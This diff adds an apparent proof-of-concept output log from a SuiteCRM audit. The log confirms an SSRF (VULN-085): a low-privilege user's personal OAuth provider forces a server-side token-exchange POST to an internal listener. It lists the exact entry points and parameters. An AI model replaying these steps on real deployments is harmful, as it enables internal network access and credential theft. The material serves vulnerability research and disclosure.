@@ -1,0 +1,25 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-085/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-085/../.venv
+========================================================================
+VULN-085: Personal ExternalOAuthProvider url_access_token SSRF
+target: http://localhost:33116
+========================================================================
+[SETUP] OOB HTTP listener on 0.0.0.0:33119 (app reaches it at 172.18.0.1:33119)
+[SETUP] url_access_token will be set to internal-only target: http://172.18.0.1:33119/token-oauth085_94163786
+[STEP] admin web login (provisioning only)
+[OK] admin session established
+[STEP] provisioning a fresh NON-ADMIN user (proves PR:L)
+[OK] created user mod_323cf071 (id=6fb21c1d-794a-4360-9756-08971d489ed8)
+[STEP] web login as low-priv user mod_323cf071 (single session reused for create + authorize + callback)
+[OK] low-priv session established
+[STEP] POST create PERSONAL OAuth provider 'provider_79a9db02' as low-priv user, url_access_token=http://172.18.0.1:33119/token-oauth085_94163786
+[INFO] Save HTTP 301, Location: index.php?module=ExternalOAuthProvider&action=DetailView&record=b4658433-d317-45e6-95c7-46c14aefdd6a
+[OK] created ExternalOAuthProvider id=b4658433-d317-45e6-95c7-46c14aefdd6a (owned by mod_323cf071, created_by == their own user id -- verified via DB in notes.md)
+[STEP] GET entryPoint=redirectToExternalOAuth&provider=b4658433-d317-45e6-95c7-46c14aefdd6a (drives $_SESSION['oauth2state'], captured from the 302 Location)
+[INFO] redirectToExternalOAuth HTTP 302, Location: https://example.com/oauth/authorize?scope=&state=0889b7debab6a8ad410554daeb153e43&response_type=code&approval_prompt=auto&redirect_uri=http%3A%2F%2Flocalhost%3A33116%2Fep%2FsetExternalOAuthToken&client_id=poc-client
+[OK] state=0889b7debab6a8ad410554daeb153e43
+[STEP] GET entryPoint=setExternalOAuthToken&provider=b4658433-d317-45e6-95c7-46c14aefdd6a&state=0889b7debab6a8ad410554daeb153e43&code=anycode -- triggers the server-side POST to url_access_token
+[INFO] setExternalOAuthToken HTTP 200, body: "<body>\n<script>\n    var data;\n    const channel = new BroadcastChannel('auth');\n                        data = ['access_token', 'poc-access-token'];\n            channel.postMessage(data);\n                    data = ['expires_in', '1790631176'];\n            channel.postMessage(data);\n                    data = ['refresh_token', 'Array'];\n            channel.postMessage(data);\n                    da"
+[PROOF] OOB listener received POST /token-oauth085_94163786 with body b'client_id=poc-client&client_secret=poc-secret&redirect_uri=http%3A%2F%2Flocalhost%3A33116%2Fep%2FsetExternalOAuthToken&grant_type=authorization_code&code=anycode' -- the SuiteCRM server performed the league/oauth2-client token exchange against a URL only the record's own bean field controlled, on an internal-only address, driven entirely by a non-admin user's own request.
+[PROOF] response also reflects the forged token exchange result back into the page (setToken.tpl render): "<body>\n<script>\n    var data;\n    const channel = new BroadcastChannel('auth');\n                        data = ['access_token', 'poc-access-token'];\n            channel.postMessage(data);\n            "
+==> VULN-085: CONFIRMED — low-priv user mod_323cf071's personal OAuth provider forced a server-side token-exchange POST to http://172.18.0.1:33119/token-oauth085_94163786
